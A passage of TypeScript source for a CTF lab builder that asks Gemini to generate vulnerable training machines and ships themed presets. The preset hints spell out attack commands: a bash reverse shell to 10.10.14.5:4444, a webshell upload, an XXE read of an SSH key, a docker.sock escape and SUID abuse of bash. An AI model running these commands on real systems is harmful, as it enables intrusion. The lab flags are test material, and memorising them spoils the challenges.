    story: 'Los Pollos Hermanos opera una plataforma logística de albaranes de pollo frito y condimentos que camufla envíos confidenciales de metilamina para Madrigal Electromotive. Una referencia directa a objetos insegura (IDOR) permite interceptar las rutas y subir archivos PHP ejecutables.',
    userFlag: 'CTF{l05_p0ll05_h3rm4n05_1d0r_pwn3d}',
    rootFlag: 'CTF{1_4m_th3_0n3_wh0_kn0ck5_h3153nb3rg}',
    userFlagPath: '/home/jesse/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'bb-h1',
        level: 1,
        title: 'Manipulación de Identificadores en Facturas',
        category: 'recon',
        text: 'Revisa el parámetro `invoice_id=104` en la URL de consulta. ¿Qué ocurre si disminuyes o incrementas el valor numérico?',
      },
      {
        id: 'bb-h2',
        level: 2,
        title: 'Acceso a Albaranes de Distribución Ocultos',
        category: 'foothold',
        text: 'El albarán `invoice_id=42` contiene un formulario administrativo para adjuntar recibos firmados sin verificar la extensión del archivo.',
      },
      {
        id: 'bb-h3',
        level: 3,
        title: 'Carga de Webshell y Bypass de Extensión',
        category: 'foothold',
        text: 'Sube un archivo `.phtml` o `.php5` con una webshell básica. Accede a `/uploads/shell.phtml?cmd=cat /home/jesse/user.txt` para obtener la primera bandera.',
      },
      {
        id: 'bb-h4',
        level: 1,
        title: 'Automatización de Envíos en el Sistema',
        category: 'privesc',
        text: 'Inspecciona las tareas automáticas del sistema operativo en `/etc/cron*` y temporizadores de systemd.',
      },
      {
        id: 'bb-h5',
        level: 2,
        title: 'Script de Sincronización de Madrigal',
        category: 'privesc',
        text: 'Cada 2 minutos, root ejecuta `/opt/madrigal/sync_inventory.sh`. Comprueba los permisos de archivo con `ls -la /opt/madrigal/sync_inventory.sh`.',
      },
      {
        id: 'bb-h6',
        level: 3,
        title: 'Inyección de Puerta Trasera en el Cron',
        category: 'privesc',
        text: 'El script es editable por el grupo de Jesse. Añade una línea para otorgar el bit SUID a `/bin/bash` (`chmod u+s /bin/bash`) y espera la ejecución del cron.',
      },
    ],
  },
  'big-bang-theory': {
    themeName: 'The Big Bang Theory - Caltech Quantum Theory Cluster',
    genre: 'tv_series',
    codename: 'CALTECH_SHELDON_CLUSTER_01',
    difficulty: 'Medium',
    vector: 'Command Injection en Calculadora de Matriz Cuántica',
    secondaryVector: 'Binario SUID de control de nitrógeno líquido con secuestro de librería compartida',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.170',
    story: 'En el Departamento de Física Teórica de Caltech, Sheldon Cooper ha protegido celosamente el servidor de supercomputación donde compila simulaciones de la Teoría de Cuerdas y almacena el borrador de su futuro Premio Nobel. Leonard y Raj descubrieron que la calculadora web de matrices cuánticas no filtra caracteres de shell al evaluar expresiones sympy.',
    userFlag: 'CTF{b4z1ng4_5h3ld0n_c00p3r_qu4ntum_c0mput3}',
    rootFlag: 'CTF{str1ng_th30ry_n0b3l_pr1z3_5h3ld0n_r00t}',
    userFlagPath: '/home/leonard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'bbt-h1', level: 1, title: 'Análisis de Parámetros Matemáticos', category: 'recon', text: 'Inspecciona la petición POST en /api/quantum-flux. ¿Se sanitizan operadores como punto y coma (;) o tuberías (|)?' },
      { id: 'bbt-h2', level: 2, title: 'Inyección de Comandos Bash', category: 'foothold', text: 'Envía "matrix=identity; id" para comprobar la ejecución de comandos bajo la cuenta de servicio leonard.' },
      { id: 'bbt-h3', level: 3, title: 'Reverse Shell hacia tu Máquina', category: 'foothold', text: 'Usa "matrix=identity; bash -c \'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\'" para capturar la bandera user.txt.' },
      { id: 'bbt-h4', level: 1, title: 'Inspección de Binarios de Laboratorio', category: 'privesc', text: 'Ejecuta "find / -perm -u=s -type f 2>/dev/null". Observa el ejecutable /usr/local/bin/cryo-coolant.' },
      { id: 'bbt-h5', level: 2, title: 'Ldd y Dependencias de Librerías', category: 'privesc', text: 'Ejecuta ldd /usr/local/bin/cryo-coolant. Busca librerías en /usr/local/lib con permisos de escritura para el grupo physics.' },
      { id: 'bbt-h6', level: 3, title: 'Sobrescritura de libcoolant.so', category: 'privesc', text: 'Compila una librería maliciosa con constructor __attribute__((constructor)) en /usr/local/lib/libcoolant.so para spawnear /bin/bash como root.' },
    ],
  },
  'lost-dharma': {
    themeName: 'Lost - Dharma Initiative Swan Station Terminal',
    genre: 'tv_series',
    codename: 'DHARMA_SWAN_STATION_108',
    difficulty: 'Hard',
    vector: 'Buffer Overflow en Intérprete de Números 4 8 15 16 23 42 (Puerto 108 TCP)',
    secondaryVector: 'Permiso NOPASSWD en el script failsafe_protocol.sh del campo electromagnético',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.180',
    story: 'En la Isla, oculta tras una escotilla subterránea, opera la Estación 3 (El Cisne) de la Iniciativa Dharma. Cada 108 minutos, una alarma exige introducir la secuencia 4 8 15 16 23 42 en una terminal Apple II conectada a un servidor UNIX para disipar la acumulación electromagnética. Desmond Hume descubrió que el demonio de red del puerto 108 no valida la longitud del búfer de entrada.',
    userFlag: 'CTF{4_8_15_16_23_42_dh4rm4_15l4nd_pwn3d}',
    rootFlag: 'CTF{5w4n_3l3ctr0m4gn3t1c_f41l54f3_turn_k3y_r00t}',
    userFlagPath: '/home/desmond/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'lost-h1', level: 1, title: 'Escaneo de Puertos Extraños', category: 'recon', text: 'Realiza un escaneo completo de puertos TCP. Descubrirás el servicio "dharma-timer" escuchando en el puerto 108.' },
      { id: 'lost-h2', level: 2, title: 'Prueba de Desbordamiento de Cadena', category: 'foothold', text: 'Conéctate con nc 10.10.110.180 108 y envía más de 128 caracteres. Observa si el servicio se reinicia o produce un segmentation fault.' },
      { id: 'lost-h3', level: 3, title: 'Sobrescritura de EIP/RIP', category: 'foothold', text: 'El binario carece de protección de pila (No-Canary). Sobrescribe la dirección de retorno para saltar a la función secret_island_debug() que ejecuta una shell.' },
      { id: 'lost-h4', level: 1, title: 'Auditoría Sudo de Desmond', category: 'privesc', text: 'Ejecuta "sudo -l". Comprueba los comandos que Desmond Hume puede ejecutar como superusuario.' },
      { id: 'lost-h5', level: 2, title: 'Inspección de /opt/dharma/failsafe.sh', category: 'privesc', text: 'El script invoca una función externa definida en un archivo de configuración modificable por desmond.' },
      { id: 'lost-h6', level: 3, title: 'Inyección en la Configuración de Failsafe', category: 'privesc', text: 'Inserta "FAILSAFE_ACTION=/bin/bash" en /etc/dharma/station.conf y ejecuta sudo /opt/dharma/failsafe.sh para obtener root.' },
    ],
  },
  'x-files': {
    themeName: 'The X-Files - FBI Classified Vault & Syndicate Secrets',
    genre: 'tv_series',
    codename: 'FBI_XFILES_ARCHIVE_01',
    difficulty: 'Medium',
    vector: 'SQL Injection en Buscador de Archivos Clasificados Forenses',
    secondaryVector: 'Capacidades de Linux mal configuradas (cap_setuid) en visor de microfichas',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.190',
    story: 'En el sótano sin ventanas de la sede central del FBI en Washington D.C., los agentes especiales Fox Mulder y Dana Scully catalogan avistamientos de OVNIs y casos paranormales no resueltos. El Sindicato gubernamental y El Fumador han bloqueado el acceso a las autopsias biológicas. Una inyección SQL en el buscador de evidencias permite eludir la autenticación.',
    userFlag: 'CTF{th3_truth_15_0ut_th3r3_mul5cully_pwn3d}',
    rootFlag: 'CTF{c1g4r3tt3_5m0k1ng_m4n_5ynd1c4t3_r00t}',
    userFlagPath: '/home/mulder/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'xf-h1', level: 1, title: 'Prueba de Caracteres en el Buscador', category: 'recon', text: 'Introduce una comilla simple (\') en el campo de búsqueda de casos de avistamientos.' },
      { id: 'xf-h2', level: 2, title: 'Bypass de Autenticación con UNION SELECT', category: 'foothold', text: 'Usa una inyección basada en UNION para concatenar columnas de la tabla fbi_agents_credentials.' },
      { id: 'xf-h3', level: 3, title: 'Extracción de la Clave de Fox Mulder', category: 'foothold', text: 'Extrae el hash de la clave de Mulder, cracked con rockyou.txt (sp00kymuld3r) y accede por SSH.' },
      { id: 'xf-h4', level: 1, title: 'Inspección de Linux Capabilities', category: 'privesc', text: 'Ejecuta "getcap -r / 2>/dev/null". Examina el binario /usr/bin/microfiche-viewer.' },
      { id: 'xf-h5', level: 2, title: 'Detección de cap_setuid+ep', category: 'privesc', text: 'El visor tiene cap_setuid+ep asignado y admite un flag de depuración (-e) para ejecutar comandos.' },
      { id: 'xf-h6', level: 3, title: 'Ejecución con Privilegios Root', category: 'privesc', text: 'Ejecuta "/usr/bin/microfiche-viewer -e /bin/bash" para obtener una shell interactiva de root.' },
    ],
  },
  'game-of-thrones': {
    themeName: 'Game of Thrones - Lord Varys Little Birds Network',
    genre: 'tv_series',
    codename: 'RED_KEEP_LITTLE_BIRDS_01',
    difficulty: 'Medium',
    vector: 'Inyección XXE (XML External Entity) en Receptor de Cuervos Digitales',
    secondaryVector: 'Sudo NOPASSWD en el script de forja de fuego valyrio del piromante',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.200',
    story: 'En la Fortaleza Roja de Desembarco del Rey, Lord Varys "La Araña" gestiona una red de pequeños pajaritos que interceptan los cuervos con mensajes de los Siete Reinos y el Banco de Hierro. Los pergaminos se procesan mediante un endpoint XML que no deshabilita entidades externas (XXE), permitiendo exfiltrar archivos locales del castillo.',
    userFlag: 'CTF{w1nt3r_15_c0m1ng_h0u53_5t4rk_pwn3d}',
    rootFlag: 'CTF{dr4c4ry5_1r0n_thr0n3_v4lyr14n_f1r3_r00t}',
    userFlagPath: '/home/varys/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'got-h1', level: 1, title: 'Inspección de Mensajes de Cuervos', category: 'recon', text: 'El formulario /crows/dispatch.php envía una estructura XML con remitente y mensaje.' },
      { id: 'got-h2', level: 2, title: 'Definición de Entidad Externa XML', category: 'foothold', text: 'Declara <!DOCTYPE raven [ <!ENTITY xxe SYSTEM "file:///home/varys/user.txt"> ]> e imprime &xxe;.' },
      { id: 'got-h3', level: 3, title: 'Lectura de Clave Privada id_rsa', category: 'foothold', text: 'Usa la entidad para leer "file:///home/varys/.ssh/id_rsa", dale permisos 600 e inicia sesión por SSH.' },
      { id: 'got-h4', level: 1, title: 'Comandos Sudo de Varys', category: 'privesc', text: 'Ejecuta "sudo -l". Observa el permiso para ejecutar /opt/guild_alchemists/wildfire_mix.py.' },
      { id: 'got-h5', level: 2, title: 'Secuestro de Módulo de Python (Hijacking)', category: 'privesc', text: 'El script importa el módulo "alchemy" sin ruta absoluta. Verifica si tu directorio actual tiene prioridad en PYTHONPATH.' },
      { id: 'got-h6', level: 3, title: 'Creación de alchemy.py Malicioso', category: 'privesc', text: 'Crea alchemy.py en tu carpeta actual con import os; os.system("/bin/bash") y ejecuta sudo /opt/guild_alchemists/wildfire_mix.py.' },
    ],
  },
  'silicon-valley': {
    themeName: 'Silicon Valley - Pied Piper Distributed Cluster',
    genre: 'tv_series',
    codename: 'PIED_PIPER_MIDDLE_OUT_01',
    difficulty: 'Medium',
    vector: 'Deserialización Insegura de Métricas Weissman en Microservicio Flask',
    secondaryVector: 'Socket de Docker (/var/run/docker.sock) expuesto sin permisos de grupo',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.210',
    story: 'En Silicon Valley, Pied Piper ha desarrollado el revolucionario algoritmo de compresión "Middle-Out" con un Weissman Score imbatible. Bertram Gilfoyle ha levantado un clúster casero de servidores bautizado como "Anton". Gavin Belson y Hooli intentan sabotearlo. Una falla de deserialización con Pickle en el microservicio de telemetría permite tomar control del clúster.',
    userFlag: 'CTF{m1ddl3_0ut_c0mpr35510n_w3155m4n_5c0r3}',
    rootFlag: 'CTF{4nt0n_53rv3r_g1lf0yl3_d0ck3r_35c4p3_r00t}',
    userFlagPath: '/home/richard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'sv2-h1', level: 1, title: 'Inspección de Cabeceras de Compresión', category: 'recon', text: 'Analiza el endpoint /api/metrics/weissman. Recibe datos binarios comprimidos en Base64.' },
      { id: 'sv2-h2', level: 2, title: 'Identificación de Objeto Pickle en Python', category: 'foothold', text: 'Al decodificar la cadena base64 se observa la firma de serialización estándar de Python pickle (\\x80).' },
      { id: 'sv2-h3', level: 3, title: 'Payload con __reduce__ para RCE', category: 'foothold', text: 'Genera un payload con una clase que implemente __reduce__ para ejecutar una reverse shell y captura user.txt.' },
      { id: 'sv2-h4', level: 1, title: 'Pertenencia a Grupos de Richard', category: 'privesc', text: 'Ejecuta "id". Observa que el usuario richard pertenece al grupo "docker" o tiene acceso directo al socket.' },
      { id: 'sv2-h5', level: 2, title: 'Comprobación de /var/run/docker.sock', category: 'privesc', text: 'Verifica los permisos del socket UNIX de Docker. Puedes comunicarte directamente con el daemon de Docker.' },
      { id: 'sv2-h6', level: 3, title: 'Escape de Contenedor y Montaje de /', category: 'privesc', text: 'Ejecuta "docker run -v /:/host -it debian chroot /host /bin/bash" para obtener acceso root al sistema anfitrión.' },
    ],
  },
};

// Helper: Generate Python standalone generator script
function generatePythonScriptCode(scenario: any): string {
  const codeLower = (scenario.codename || 'ctf').toLowerCase();
  return `#!/usr/bin/env python3
"""
NetPhantom CTF Scenario Generator
Automated provisioning & challenge builder for educational cybersecurity competitions.
Theme: ${scenario.themeName || scenario.codename}
Target Difficulty: ${scenario.difficulty}
Attack Vector: ${scenario.vector}
"""

import os
import sys
import argparse
import hashlib
import json
from pathlib import Path

SCENARIO_CONFIG = ${JSON.stringify(
    {
      codename: scenario.codename,
      themeName: scenario.themeName,
      genre: scenario.genre || 'custom',
      difficulty: scenario.difficulty,
      vector: scenario.vector,
      secondaryVector: scenario.secondaryVector,
      targetOS: scenario.targetOS,
      ip: scenario.ip,
      userFlag: scenario.userFlag,
      rootFlag: scenario.rootFlag,
      userFlagPath: scenario.userFlagPath,
      rootFlagPath: scenario.rootFlagPath,
    },
    null,
    2
  )}

DOCKERFILE_CONTENT = """${(scenario.dockerfile || '').replace(/"/g, '\\"')}"""
COMPOSE_CONTENT = """${(scenario.dockerCompose || '').replace(/"/g, '\\"')}"""
PROVISION_CONTENT = """${(scenario.provisionScript || '').replace(/"/g, '\\"')}"""

def randomize_flags(seed_prefix="NETPHANTOM"):
    """Optionally randomize flags with custom entropy while maintaining format."""
    salt_user = hashlib.sha256(f"{seed_prefix}_USER_{os.urandom(8)}".encode()).hexdigest()[:16]
    salt_root = hashlib.sha256(f"{seed_prefix}_ROOT_{os.urandom(8)}".encode()).hexdigest()[:24]
    user_flag = f"CTF{{${codeLower}_user_{salt_user}}}"
    root_flag = f"CTF{{${codeLower}_root_{salt_root}}}"
    return user_flag, root_flag

def export_challenge_lab(output_dir: str, randomize: bool = False):
    out = Path(output_dir)
    out.mkdir(parents=True, exist_ok=True)
    
    cfg = dict(SCENARIO_CONFIG)
    if randomize:
        u_flag, r_flag = randomize_flags()
        cfg["userFlag"] = u_flag
        cfg["rootFlag"] = r_flag
        print(f"[+] Randomized Flags generated:")
        print(f"    User: {u_flag}")
        print(f"    Root: {r_flag}")
    
    # Save scenario metadata
    with open(out / "scenario.json", "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    print(f"[+] Scenario config written to {out / 'scenario.json'}")
    
    # Write Dockerfile
    with open(out / "Dockerfile", "w", encoding="utf-8") as f:
        f.write(DOCKERFILE_CONTENT)
    print(f"[+] Dockerfile written to {out / 'Dockerfile'}")
    
    # Write docker-compose.yml
    with open(out / "docker-compose.yml", "w", encoding="utf-8") as f:
        f.write(COMPOSE_CONTENT)
    print(f"[+] docker-compose.yml written to {out / 'docker-compose.yml'}")
    
    # Write provision.sh
    prov_file = out / "provision.sh"
    with open(prov_file, "w", encoding="utf-8") as f:
        content = PROVISION_CONTENT
        if randomize:
            content = content.replace(SCENARIO_CONFIG["userFlag"], cfg["userFlag"])
            content = content.replace(SCENARIO_CONFIG["rootFlag"], cfg["rootFlag"])
        f.write(content)
    prov_file.chmod(0o755)
    print(f"[+] Provisioning bash script written to {prov_file} (chmod +x)")
    
    print("\\n[+] CTF Lab ready! To launch isolated environment:")
    print(f"    cd {output_dir}")
    print("    docker compose up --build -d")
    print(f"    nmap -sC -sV -p- {cfg['ip']}")

def main():
    parser = argparse.ArgumentParser(description="NetPhantom CTF Vulnerable Machine Builder")
    parser.add_argument("-o", "--output", default="./ctf_lab_output", help="Directory where files will be created")
    parser.add_argument("--randomize-flags", action="store_true", help="Generate fresh cryptographic tokens for flags")
    parser.add_argument("--info", action="store_true", help="Display scenario challenge specifications")
    
    args = parser.parse_args()
    
    if args.info:
        print(f"=== NetPhantom CTF Challenge: {SCENARIO_CONFIG['themeName']} ===")
        print(f"Codename:        {SCENARIO_CONFIG['codename']}")
        print(f"Difficulty:      {SCENARIO_CONFIG['difficulty']}")
        print(f"Initial Vector:  {SCENARIO_CONFIG['vector']}")
        print(f"PrivEsc Vector:  {SCENARIO_CONFIG['secondaryVector']}")
        print(f"Target OS:       {SCENARIO_CONFIG['targetOS']}")
        print(f"Simulated IP:    {SCENARIO_CONFIG['ip']}")
        sys.exit(0)
        
    print(f"[*] Building challenge: {SCENARIO_CONFIG['codename']} ({SCENARIO_CONFIG['difficulty']})")
    export_challenge_lab(args.output, randomize=args.randomize_flags)

if __name__ == "__main__":
    main()
`;
}

// Route: Generate CTF Scenario via Gemini
// --- Input validation helpers for the AI-backed routes ---
// Everything here is attacker-controlled (any visitor to the local server),
// so every field is type- and length-checked before it is spliced into a
// Gemini prompt or echoed back, instead of trusted as-is.
const MAX_SHORT_FIELD = 200;
const MAX_NOTES_FIELD = 2000;
const MAX_CHAT_MESSAGE = 4000;
const MAX_CHAT_HISTORY = 40;

function cleanShortString(value: unknown, maxLen: number, fallback: string): string {
  if (typeof value !== 'string') return fallback;
  const trimmed = value.trim();
  if (!trimmed) return fallback;
  return trimmed.slice(0, maxLen);
}

function validateScenarioBody(body: any): { error: string } | {
  theme: string;
  genre: string;
  customThemeName: string;
  difficulty: string;
  vector: string;
  secondaryVector: string;
  targetOS: string;
  flagPrefix: string;
  customNotes: string;
} {
  if (!body || typeof body !== 'object') {
    return { error: 'Cuerpo de la petición inválido.' };
  }
  const allowedDifficulties = ['Easy', 'Medium', 'Hard', 'Insane'];
  const difficulty = typeof body.difficulty === 'string' && allowedDifficulties.includes(body.difficulty)
    ? body.difficulty
    : 'Medium';
  return {
    theme: cleanShortString(body.theme, MAX_SHORT_FIELD, 'mr-robot'),
    genre: cleanShortString(body.genre, MAX_SHORT_FIELD, 'tv_series'),
    customThemeName: cleanShortString(body.customThemeName, MAX_SHORT_FIELD, ''),
    difficulty,
    vector: cleanShortString(body.vector, MAX_SHORT_FIELD, 'SSTI (Server-Side Template Injection)'),
    secondaryVector: cleanShortString(body.secondaryVector, MAX_SHORT_FIELD, 'SUID Custom Binary'),
    targetOS: cleanShortString(body.targetOS, MAX_SHORT_FIELD, 'Debian 12 Bookworm'),
    flagPrefix: cleanShortString(body.flagPrefix, 40, 'CTF'),
    customNotes: cleanShortString(body.customNotes, MAX_NOTES_FIELD, ''),
  };
}

app.post('/api/generate-scenario', aiRateLimiter, async (req, res) => {
  try {
    const validated = validateScenarioBody(req.body);
    if ('error' in validated) {
      return res.status(400).json({ success: false, error: validated.error });
    }
    const {
      theme,
      genre,
      customThemeName,
      difficulty,
      vector,
      secondaryVector,
      targetOS,
      flagPrefix,
      customNotes,
    } = validated;

    const ai = getGeminiClient();

    const promptText = `
You are a premier Cybersecurity CTF Challenge Architect and DevSecOps Engineer.
Design a complete, high-quality, educationally rigorous, and entertaining CTF vulnerable machine based on the following specifications:

- Theme / Narrative: ${customThemeName || theme}
- Genre: ${genre}
- Target Difficulty: ${difficulty}
- Primary Initial Exploitation Vector: ${vector}
- Secondary Privilege Escalation Vector: ${secondaryVector}
- Target OS: ${targetOS}
- Flag Format: ${flagPrefix}{...}
- Additional Instructor Notes: ${customNotes || 'Ensure realistic sandbox setup with gradual hints.'}

Return a valid JSON object strictly matching this TypeScript structure:
{
  "codename": "UPPERCASE_MACHINE_CODENAME",
  "themeName": "Descriptive Title with Genre/Series Reference",
  "genre": "${genre}",
  "difficulty": "${difficulty}",
  "vector": "${vector}",
  "secondaryVector": "${secondaryVector}",
  "targetOS": "${targetOS}",
  "ip": "10.10.X.Y",
  "story": "Engaging 2-3 paragraph storyline describing the organization, the environment, why this system exists in the narrative lore, and the student's mission.",
  "userFlag": "${flagPrefix}{themed_user_token}",
  "rootFlag": "${flagPrefix}{themed_root_token}",
  "userFlagPath": "/home/username/user.txt",
  "rootFlagPath": "/root/root.txt",
  "openPorts": [
    { "port": 22, "service": "SSH", "version": "OpenSSH 9.2p1", "purpose": "Administrative remote access" },
    { "port": 80, "service": "HTTP", "version": "nginx/1.24 + Gunicorn/Flask", "purpose": "Vulnerable customer portal" }
  ],
  "topology": {
    "nodes": [
      { "id": "attacker", "label": "Kali Attacker (10.10.14.2)", "type": "attacker", "role": "Estudiante / Auditor" },
      { "id": "firewall", "label": "Perimeter Firewall (10.10.110.1)", "type": "gateway", "role": "Filtrado DMZ" },
      { "id": "target", "label": "Target Machine (10.10.110.42)", "type": "target", "role": "Servidor Vulnerable" },
      { "id": "internal", "label": "Internal Database / Share", "type": "internal", "role": "Bóveda de Datos" }
    ],
    "links": [
      { "from": "attacker", "to": "firewall", "proto": "TCP/All", "desc": "Túnel VPN CTF" },
      { "from": "firewall", "to": "target", "proto": "Ports: 22, 80, 445", "desc": "Servicios expuestos" },
      { "from": "target", "to": "internal", "proto": "Localhost / IPC", "desc": "Canal de escalada" }
    ]
  },
  "hints": [
    { "id": "h1", "level": 1, "title": "Inspección General", "category": "recon", "text": "Empujón conceptual sutil orientando al jugador sin revelar herramientas ni nombres de archivos." },
    { "id": "h2", "level": 2, "title": "Pista Táctica", "category": "foothold", "text": "Pista táctica señalando herramientas o cabeceras específicas a examinar." },
    { "id": "h3", "level": 3, "title": "Mecanismo del Vector", "category": "foothold", "text": "Explicación de la técnica exacta pero sin regalar la bandera ni la cadena completa." },
    { "id": "h4", "level": 1, "title": "Orientación de Escalada", "category": "privesc", "text": "Empujón conceptual para la fase de privilegios locales." },
    { "id": "h5", "level": 2, "title": "Herramienta de Auditoría Local", "category": "privesc", "text": "Comando o ruta del sistema clave para inspeccionar." },
    { "id": "h6", "level": 3, "title": "Vector de Root", "category": "privesc", "text": "Técnica precisa de elevación de privilegios." }
  ],
  "provisionScript": "#!/usr/bin/env bash\\n# Complete bash setup script with comments...\\n",
  "dockerfile": "FROM debian:12-slim\\n# Complete runnable Dockerfile...\\n",
  "dockerCompose": "version: '3.8'\\nservices:\\n  vulnerable_node:\\n    build: .\\n    container_name: ctf_target\\n    hostname: ctf_target\\n    ports:\\n      - '8080:80'\\n      - '2222:22'\\n    networks:\\n      ctf_isolated_net:\\n        ipv4_address: 10.10.110.42\\n    restart: unless-stopped\\nnetworks:\\n  ctf_isolated_net:\\n    driver: bridge\\n    ipam:\\n      config:\\n        - subnet: 10.10.110.0/24\\n",
  "walkthrough": "# Complete Markdown writeup detailing Recon, Initial Foothold, Privilege Escalation, and Mitigation/Hardening Guidance."
}

CRITICAL RULES:
1. Provide at least 6 gradual hints: 3 for initial foothold (Level 1 subtle, Level 2 tactical, Level 3 direct vector) and 3 for privilege escalation.
2. The docker-compose.yml must be completely runnable with 'docker compose up' or 'docker-compose up', defining isolated bridge network 'ctf_isolated_net' and container name.
3. Return ONLY pure JSON.
`;

    let generatedData: any = null;
    let usedFallback = false;
    let fallbackReason = '';

    const apiKeyConfigured = Boolean(
      process.env.GEMINI_API_KEY && process.env.GEMINI_API_KEY.trim() !== '' && process.env.GEMINI_API_KEY !== 'MY_GEMINI_API_KEY'
    );

    try {
      if (!apiKeyConfigured) {
        throw new Error('No hay GEMINI_API_KEY configurada en el servidor.');
      }
      const selectedModel = await getBestAvailableModel(ai);
      const response = await ai.models.generateContent({
        model: selectedModel,
        contents: promptText,
        config: {
          responseMimeType: 'application/json',
          temperature: 0.7,
        },
      });

      const responseText = response.text || '';
      const cleanJson = responseText.replace(/^```json\s*/i, '').replace(/```\s*$/i, '').trim();
      generatedData = JSON.parse(cleanJson);
    } catch (apiError: any) {
      usedFallback = true;
      fallbackReason = apiKeyConfigured
        ? `La IA de Gemini no respondió correctamente (${apiError?.message || 'error desconocido'}). Se usó un escenario del catálogo offline.`
        : 'No hay GEMINI_API_KEY configurada. Se usó un escenario del catálogo offline (Modo Offline).';
      console.warn('Gemini API scenario generation fallback to curated preset:', apiError?.message);
      const presetKey = theme in DEFAULT_PRESETS ? theme : 'mr-robot';
      const preset = DEFAULT_PRESETS[presetKey];
      
      generatedData = {
        codename: preset.codename,
        themeName: customThemeName || preset.themeName,
        genre: preset.genre || genre,
        difficulty: difficulty,
        vector: vector,
        secondaryVector: secondaryVector,
        targetOS: targetOS,
        ip: preset.ip,
        story: preset.story,
        userFlag: preset.userFlag,
        rootFlag: preset.rootFlag,
        userFlagPath: preset.userFlagPath,
        rootFlagPath: preset.rootFlagPath,
        hints: preset.hints || [
          {
            id: 'gen-h1',
            level: 1,
            title: 'Empujón Conceptual',
            category: 'recon',
            text: 'Revisa minuciosamente los puertos descubiertos en la fase de mapeo. ¿Cuál expone lógica interactiva?',
          },
          {
            id: 'gen-h2',
            level: 2,
            title: 'Pista Táctica',
            category: 'foothold',
            text: `El vector inicial se basa en ${vector}. Analiza cómo se procesa la entrada en el servicio principal.`,
          },
          {
            id: 'gen-h3',
            level: 3,
            title: 'Vector Dirigido',
            category: 'foothold',
            text: 'Explota la vulnerabilidad para obtener una reverse shell hacia tu máquina atacante.',
          },
          {
            id: 'gen-h4',
            level: 1,
            title: 'Reconocimiento Interno',
            category: 'privesc',
            text: 'Busca archivos con permisos inusuales o configuraciones no estándar en el sistema operativo.',
          },
          {
            id: 'gen-h5',
            level: 2,
            title: 'Auditoría de Escalada',
            category: 'privesc',
            text: `La vía de escalada es: ${secondaryVector}. Revisa las rutas del sistema y variables de entorno.`,
          },
          {
            id: 'gen-h6',
            level: 3,
            title: 'Extracción de Bandera Root',
            category: 'privesc',
            text: `Eleva privilegios a superusuario para acceder a ${preset.rootFlagPath}.`,
          },
        ],
        // Este fallback genérico (sin clave de Gemini o con la API caída) NO
        // instala ningún servicio de red real: solo crea un usuario y dos
        // ficheros de bandera accesibles vía "docker exec". No se anuncian
        // puertos abiertos para no inducir a error en el reconocimiento.
        openPorts: [],
        topology: {
          nodes: [
            { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Estudiante / Red Team' },
            { id: 'firewall', label: 'Gateway DMZ (10.10.110.1)', type: 'gateway', role: 'Segmentación de red' },
            { id: 'target', label: `${preset.codename} (${preset.ip})`, type: 'target', role: 'Máquina Objetivo' },
            { id: 'vault', label: 'Bóveda de Credenciales / Root', type: 'internal', role: 'Objetivo Final' },
          ],
          links: [
            { from: 'attacker', to: 'firewall', proto: 'VPN WireGuard', desc: 'Acceso a laboratorio aislado' },
            { from: 'firewall', to: 'target', proto: 'docker exec', desc: 'Sin servicio de red: acceso de práctica vía shell del contenedor' },
            { from: 'target', to: 'vault', proto: 'IPC / Sudo / SUID', desc: 'Ruta de escalada local' },
          ],
        },
        provisionScript: `#!/usr/bin/env bash
# NetPhantom CTF Automated Provisioning Script (plantilla genérica de reserva,
# sin IA disponible). No expone ningún servicio de red: usa
# "docker exec -it ${preset.codename.toLowerCase()} bash" para practicar la
# búsqueda de banderas y la escalada de privilegios local.
set -euo pipefail
echo "[*] Initializing NetPhantom CTF Environment: ${preset.codename}"
apt-get update -y && apt-get install -y python3 python3-pip python3-venv sudo curl net-tools procps
useradd -m -s /bin/bash player
echo "player:Password123!" | chpasswd
mkdir -p /opt/vulnerable_app
echo "${preset.userFlag}" > ${preset.userFlagPath}
chmod 640 ${preset.userFlagPath}
echo "${preset.rootFlag}" > ${preset.rootFlagPath}
chmod 600 ${preset.rootFlagPath}
echo "[+] Lab provisioned successfully. Container will stay up for 'docker exec' access."
exec sleep infinity
`,
        dockerfile: `FROM debian:12-slim
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y python3 python3-pip python3-venv gcc sudo curl procps && rm -rf /var/lib/apt/lists/*
RUN useradd -m -s /bin/bash player
WORKDIR /app
COPY provision.sh /app/provision.sh
RUN chmod +x /app/provision.sh
CMD ["/app/provision.sh"]
`,
        dockerCompose: `version: '3.8'

services:
  ctf_target:
    build: .
    container_name: ${preset.codename.toLowerCase()}
    hostname: ${preset.codename.toLowerCase()}
    networks:
      ctf_isolated_net:
        ipv4_address: ${preset.ip}
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1024M

networks:
  ctf_isolated_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.110.0/24
`,
        walkthrough: `# Guía de Resolución: ${preset.codename}
## 1. Reconocimiento
Escaneo nmap sobre ${preset.ip}:
\`\`\`bash
nmap -sC -sV -p- -T4 ${preset.ip}
\`\`\`
## 2. Acceso Inicial - Vector: ${vector}
Explotación de la vulnerabilidad para obtener ${preset.userFlag}.
## 3. Escalada de Privilegios - Vector: ${secondaryVector}
Elevación a superusuario para leer ${preset.rootFlagPath}: ${preset.rootFlag}.
`,
      };
    }

    // Ensure hints array exists
    if (!generatedData.hints || !Array.isArray(generatedData.hints)) {
      generatedData.hints = [
        {
          id: 'def-h1',
          level: 1,
          title: 'Empujón Conceptual',
          category: 'recon',
          text: 'Comienza analizando la respuesta del servidor en los puertos abiertos.',
        },
        {
          id: 'def-h2',
          level: 2,
          title: 'Pista Táctica',
          category: 'foothold',
